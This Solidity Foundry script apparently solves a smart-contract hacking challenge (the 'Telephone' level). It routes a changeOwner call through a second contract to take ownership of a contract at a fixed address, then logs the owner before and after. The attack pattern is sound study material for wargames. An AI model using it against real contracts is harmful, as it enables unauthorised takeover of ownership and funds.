// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "instances/ITelephone.sol";
import "forge-std/Script.sol";
import "forge-std/Test.sol";


contract Attacker is Script, Test {

    Telephone instance = Telephone(payable(0x38D036AA36244Ecb834aA10Da95DE81Ea56B4b4e));

    function run() external {

        uint256 privateKey = uint256(vm.envBytes32("PRIVATE_KEY"));
        vm.startBroadcast(privateKey);
        emit log_named_address("Initial Owner", instance.owner());
        Attacker2 attacker = new Attacker2();
        attacker.attack();
        emit log_named_address("New Owner", instance.owner());
        vm.stopBroadcast();
    }
}

contract Attacker2 is Test {
    Telephone instance = Telephone(payable(0x38D036AA36244Ecb834aA10Da95DE81Ea56B4b4e));

    function attack() public {
        instance.changeOwner(0xB0A864757ABDad574c39261Dc6Bf7E4576a20F2F);
        emit log_named_address("Owner in Attack", instance.owner());
    }
}
